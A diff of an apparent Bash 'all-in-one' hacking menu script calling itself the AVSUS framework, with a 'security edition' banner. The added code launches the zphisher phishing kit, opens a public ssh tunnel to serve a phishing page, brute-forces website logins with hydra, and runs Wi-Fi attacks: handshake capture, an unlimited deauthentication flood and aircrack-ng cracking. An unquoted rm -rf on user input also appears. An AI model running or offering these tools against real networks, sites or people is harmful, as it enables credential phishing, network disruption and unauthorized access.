@@ -6,36 +6,41 @@ start=$(date +%s)
 
 clear
 ##############################color
-m="\e[0;31m"
-k="\e[0;33m"
-h="\e[0;32m"
-b="\e[0;34m"
-lm="\e[1;31m"
-lk="\e[1;33m"     
-lh="\e[1;32m"    
-lb="\e[1;34m"     
-n="\e[0m"         
-w="\e[1;37m"      
+m="\e[0;31m"      # merah           # red
+k="\e[0;33m"      # kuning          # yellow
+h="\e[0;32m"      # hijau           # green
+b="\e[0;34m"      # biru            # blue
+lm="\e[1;31m"     # merah terang    # pink
+lk="\e[1;33m"     # kuning terang   # bright yellow
+lh="\e[1;32m"     # hijau terang    # light green
+lb="\e[1;34m"     # langit biru     # blue sky
+n="\e[0m"         # netral          # neutral
+w="\e[1;37m"      # putih tebal     #thick white
 
 
 ###############################give Permissons,if not root user exit
 
     
 echo -e "\033[34m
-                        _       ___     ______            
-                       | |     / \ \   / / ___| _   _ ___ 
-                      / __)   / _ \ \ / /\___ \| | | / __|
-                      \__ \  / ___ \ V /  ___) | |_| \___\
-                      (   / /_/   \_\_/  |____/ \__,_|___/
-                       |_|
-\033[0m"
-
-echo -e "\033[31m
-
-                      +-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-
-                      |S|E|U|R|I|T|Y| | |E|D|I|T|I|O|N|
-                      +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-
+_________________________________________________________________________
+|.                          .                                .           |
+|		  _       ___     ______            .                    |
+|		 | |     / \ \   / / ___| _   _ ___                    . |
+|		/ __)   / _ \ \ / /\___ \| | | / __|                     |
+|	.	\__ \  / ___ \ V /  ___) | |_| \__ SUPER         .       |
+|        	(   / /_/   \_\_/  |____/ \__,_|___/                     |
+|  		 |_|                                                     |
+|.                               |            .                     o    |
+|o                       .     --o--                      .              |
+|                                |                                       | \033[0m"
+echo -e "\033[31m|                                                                        | 
+|.                        .                          o              .    |
+|                                                                        |
+|                                                                        |
+|       .          +-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-        o            |
+|          .       |S|E|U|R|I|T|Y| | |E|D|I|T|I|O|N|            .        |
+|                  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                     |
+└________________________________________________________________________|
 \033[0m"
 while :; do
   for (( i=0; i<${#chars}; i++ )); do
@@ -90,7 +95,7 @@ echo -e "\n\n\n"
 
 echo -e "\033[34m
 <--------------------------------------------------------------------------->
-| [-] ALL-IN-BOT-BY-AVS                                                     |
+| [-] $ AVSUS FRAMEWORK                                                     |
 |                                                                           |
 | [+] DISCORD: https://discord.gg/M45DuEN5nH                                |
 | [+] EMAIL: kanishkasingh0885@gmail.com                                    |
@@ -122,13 +127,19 @@ echo "[18] CREATE A VIRUS FOR WINDOWS" | lolcat
 echo "[19] MAC OS FOR KALI LINUX" | lolcat
 echo "[20] SCAN ALL WIFI NEAR YOU AND CHECK ALL DEVICES CONNECTED WITH YOUR WIFI" | lolcat
 echo "[21] CREATE A FAKE WIFI POINT" | lolcat
-echo "[22] CRACK THE PASSWORD OF WIFI" | lolcat
+echo "[22] CRACK THE PASSWORD OF WIFICRACK THE PASSWORD OF WIFI" | lolcat
 echo "[23] TEST THE WIFI INTERFACE FOR HACKING" | lolcat
 echo "[24] DOWNLOAD SPOTIFY MUSIC USING URL" | lolcat
 echo "[25] DOWNLOAD YOUTUBE VIDEO" | lolcat
 echo "[26] SCAN BLUETOOTH NEAR YOU AND CONNECT WITH IT" | lolcat
 echo "[27] DOWNLOAD GDRIVE LINKS QUICKLY" | lolcat
 echo "[28] DOWNLOAD MEGA.nz LINK QUICKLY" | lolcat
+echo "[29] CREATE A PHISING PAGE" | lolcat
+echo "[tnl] CREATE A TUNNEL" | lolcat
+echo "[30] WEBSITE BRUTEFORCE" | lolcat
+echo "[31] SETUP WIFI WITH MONITOR MODE" | lolcat
+echo "[32] CAPTURE CAP FILE OF WIFI" | lolcat
+echo "[33] DEAUTH THE WIFI" | lolcat
 echo "[99] ADDITIONAL commands" | lolcat
 
 echo -e "\n\n\n"
@@ -292,6 +303,22 @@ process_input() {
 	# Download the file
 	megadl "$mega_link"
         ;;
+        29)
+        if [ ! -d "zphisher" ]; then
+        git clone https://github.com/htr-tech/zphisher
+        fi
+
+        cd zphisher
+        chmod +x *
+        ./zphisher.sh
+        ;;
+        "tnl")
+        if ! command -v ssh &> /dev/null; then
+            echo "ssh is not installed. Installing now..."
+            sudo apt install ssh
+        fi
+        ssh -R 80:localhost:8080 nokey@localhost.run
+        ;;
         2)
             echo "[+] STARTING 6-PIN BRUTE FORCE ATTACK"
             connected_device_ip=$(adb shell ip route | awk '/src/ { print $9 }')
@@ -412,6 +439,40 @@ process_input() {
         city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
         if [[ $city != "" ]]; then
         echo -e "${lh}[*] City Location:${n}" $city
+        fi
+        ;;
+        "remove files")
+
+        ls | lolcat
+        removefiles= ls && read -p "Enter the names of file to delete:" dfiles && rm -rf $dfiles && echo "[+] REMOVING $dfiles"
+        $removefiles
+        ;;
+        "removefiles")
+        removefiles= ls && read -p "Enter the names of file to delete:" dfiles && rm -rf $dfiles && echo "[+] REMOVING $dfiles"
+        $removefiles
+        ;;
+        30)
+        echo "THIS MAY NOT WORK [UNDER BETA]"
+        read -p "Enter the URL or domain name: " url
+        read -p "Enter the path to the wordlist file: " wordlist
+        read -p "Enter the username: " username
+
+        ip=$(dig +short $(echo "$url" | awk -F[/:] '{print $4}'))
+
+        if [[ -z $ip ]]; then
+        echo "Failed to retrieve the IP address for the given URL or domain name."
+        exit 1
+        fi
+
+        echo "[+] IP OF WEB ==> $ip"
+        echo "Starting brute-force attack..."
+
+        hydra -l $username -P $wordlist $ip http-get /login
+
+        if [ $? -eq 0 ]; then
+        echo "Brute force attack successful! Username: $username, Password found in $wordlist"
+        else
+        echo "Brute force attack unsuccessful."
         fi
         ;;
         10)
@@ -683,30 +744,10 @@ process_input() {
         echo -e "\n\n"
         ;;
         20)
-	if [ "$EUID" -ne 0 ]
-	  then echo "Please run as root"
-	  exit
-	fi
-
-	# Check if nmap is installed
-	if ! [ -x "$(command -v nmap)" ]; then
-	  echo 'Error: nmap is not installed.' >&2
-	  exit 1
-	fi
-
-	# Prompt the user to enter the name of the wireless interface to scan with
-	read -p "Enter the name of the wireless interface to scan with (e.g. wlan0, wlan1, etc.): " interface
-
-	# Scan for nearby Wi-Fi networks and display their names (SSIDs)
-	echo "Scanning for nearby Wi-Fi networks..."
-	iwlist $interface scan | grep ESSID
-
-	# Prompt the user to enter the IP address range to scan
-	read -p "Enter the IP address range to scan (e.g. 192.168.1.0/24): " ip_range
-
-	# Use nmap to scan the local network for connected devices
-	echo "Scanning local network for connected devices..."
-	nmap -sn $ip_range
+	default_interface="wlan0"
+    read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
+	interface=${interface:-$default_interface}
+    sudo airodump-ng $interface
         ;;
         21)
 	default_bssid="D0:31:45:F3:D5:8D"
@@ -735,51 +776,36 @@ process_input() {
         echo "[+] CHANGED $interface TO MONITOR MODE."
         iwconfig
         ;;
+        31)
+	default_interface="wlan0"
+    interface=${interface:-$default_interface}
+    read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
+    sudo airmon-ng check kill
+    sudo airmon-ng start $interface
+    echo "__________________________________________________________________________________________________________"
+    sudo airmon-ng
+        ;;
+        32)
+	    default_interface="wlan0"
+        read -p "ENTER WHAT WILL BE THE NAME OF THE CAPTURE FILE: " nname
+        read -p "ENTER THE CHANNEL OF WIFI: " channel
+        read -p "ENTER BSSID OF YOUR WIFI: " nbssid
+        read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
+	    interface=${interface:-$default_interface}
+        sudo airodump-ng -w $nname -c $channel --bssid $nbssid $interface
+        ;;
+        33)
+        read -p "ENTER BSSID OF YOUR WIFI: " bssid
+        read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
+        sudo aireplay-ng --deauth 0 -a  $bssid $interface
+        ;;
         22)
-	# Prompting for the Wi-Fi adapter to use
-	read -p "Enter the Wi-Fi adapter to use (wlan0 or wlan1). Press enter for default (wlan0): " wifi_adapter
-	wifi_adapter=${wifi_adapter:-wlan0}
-
-	# Checking if pass.cap file exists in the current working directory
-	if [ ! -f "pass.cap" ]; then
-	    touch "pass.cap"
-	fi
-
-	# Scanning available Wi-Fi networks
-	wifi_list=$(nmcli device wifi list)
-
-	echo "Available Wi-Fi networks:"
-	echo "$wifi_list"
-
-	# Displaying IP and BSSID of available Wi-Fi networks
-	while read -r line; do
-	    ssid=$(echo $line | awk '{print $1}')
-	    bssid=$(echo $line | awk '{print $2}')
-	    ip=$(echo $line | awk '{print $3}')
-	    echo "SSID: $ssid, BSSID: $bssid, IP: $ip"
-	done <<< "$(nmcli -f SSID,BSSID,IP4.ADDRESS device wifi list)"
-
-	# Prompting for the desired network to connect
-	read -p "Enter the BSSID of the Wi-Fi network you want to use for handshake: " selected_bssid
-
-	# Connecting to the selected network
-	nmcli device wifi connect "$selected_bssid"
-
-	# Scanning the selected network
-	sudo airodump-ng "$wifi_adapter" --bssid "$selected_bssid"
-
-	# Performing a handshake with the selected network
-	sudo aireplay-ng --deauth 0 -a "$selected_bssid" "$wifi_adapter"
-
-	# Prompting for the path to the wordlist file
-	read -p "Enter the path to the wordlist file (press enter to skip): " wordlist_path
-
-	# Cracking the handshake (with or without wordlist)
-	if [ -z "$wordlist_path" ]; then
-	    sudo aircrack-ng -b "$selected_bssid" "pass.cap"
-	else
-	    sudo aircrack-ng -b "$selected_bssid" -w "$wordlist_path" "pass.cap"
-	fi
+        read -p "ENTER THE NAME OF WIFI CAPTURE FILE {.cap FILE}: " capfile
+        read -p "ENTER THE DESTINATION OR NAME OF WORDLIST TO CRACK: " wordlist
+        aircrack-ng $capfile -w $wordlist
+        ;;
+        "pwd")
+        pwd
         ;;
         23)
 	default_bssid="D0:31:45:F3:D5:8D"
@@ -1027,6 +1053,14 @@ process_input() {
         ;;
         "What is a chemical reaction")
             echo "A chemical reaction is a process that leads to the transformation of one set of chemical substances to another. Chemical reactions can be represented by chemical equations."
+        ;;
+        "i am in which file")
+        newdestination= echo "[+] YOUR DESTINATION:" && pwd
+        $newdestination
+        ;;
+        "tell me my destination")
+        newdestination= echo "[+] YOUR DESTINATION:" && pwd
+        $newdestination
         ;;
         "What is an ecosystem")
             echo "An ecosystem is a community of living organisms in conjunction with the nonliving components of their environment (things like air, water and mineral soil), interacting as a system."
